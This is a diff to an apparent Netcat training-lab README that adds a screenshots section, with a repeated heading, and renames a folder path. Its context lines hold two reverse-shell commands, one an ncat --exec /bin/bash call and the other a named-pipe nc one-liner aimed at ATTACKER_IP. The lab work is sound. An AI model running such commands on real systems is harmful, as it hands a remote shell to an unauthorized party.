@@ -362,6 +362,20 @@ ncat 192.168.56.101 4444 --exec "/bin/bash" --keep-open
 
 🔍 **Result:** Kali gets shell access to Metasploitable2 (in lab only).
 
+## 📸 Lab Proof: Screenshots
+
+---
+
+## 📸 Lab Proof: Screenshots
+
+## 📸 Lab Proof
+
+All screenshots captured during the Netcat lab modules are available in the [`NETCAT screenshots`](NETCAT%20screenshots/) folder.  
+This includes setup steps, port scans, file transfers, chat simulation, and reverse shell execution.
+
+Use this folder to visually verify each stage of the practical work.
+
+
 
 ---
 
@@ -437,7 +451,7 @@ cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
 
 
 
-### 📸 Screenshots for each lab are stored in `/screenshots/` with matching filenames.
+### 📸 Screenshots for each lab are stored in `/NETCAT screenshots/` with matching filenames.
 
 # Netcat Lab Progress
 
